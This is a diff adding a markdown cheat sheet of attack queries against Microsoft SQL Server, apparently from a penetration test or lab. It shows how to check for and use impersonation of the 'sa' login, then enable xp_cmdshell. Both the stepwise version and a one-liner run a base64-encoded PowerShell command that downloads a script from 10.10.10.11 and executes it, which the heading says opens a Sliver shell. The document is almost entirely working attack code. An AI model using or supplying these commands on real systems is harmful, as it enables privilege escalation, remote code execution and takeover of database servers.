@@ -1,0 +1,19 @@
+# Queries
+
+### 1) Check if we can impersonate SA
+
+    SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sa');
+    EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; 
+
+
+### 2) Impersonate SA and enable xp_cmdshell and get sliver shell
+    
+    EXECUTE AS LOGIN = 'sa';
+    EXEC sp_configure 'show advanced options', 1; RECONFIGURE; 
+    EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; 
+    EXEC xp_cmdshell 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
+    
+
+## One liner
+
+    EXECUTE AS LOGIN = 'sa';EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
